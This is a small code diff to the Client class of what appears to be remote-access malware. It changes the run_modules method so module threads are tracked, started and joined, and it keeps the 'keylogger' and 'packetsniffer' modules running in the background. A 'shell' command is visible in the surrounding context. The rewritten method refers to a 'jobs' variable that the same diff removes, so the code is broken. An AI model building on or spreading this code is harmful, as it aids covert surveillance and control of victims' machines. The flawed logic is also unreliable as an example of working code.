@@ -844,8 +844,14 @@ class Client(object):
 
     @command
     def run_modules(self):
-        jobs = [Thread(target=getattr(self, mod), name=mod) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
-        return self._show({module: module.run() for module in jobs})
+        [self.threads.update({mod: Thread(target=getattr(self, mod), name=mod)}) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
+        for job in self.threads:
+            if not self.threads[job].is_alive():
+                self.threads[job].start()
+        for task in jobs:
+            if task not in ('keylogger','packetsniffer'):
+                self.threads[task].join()
+        return self._show(self.result)
 
     @command
     def shell(self):
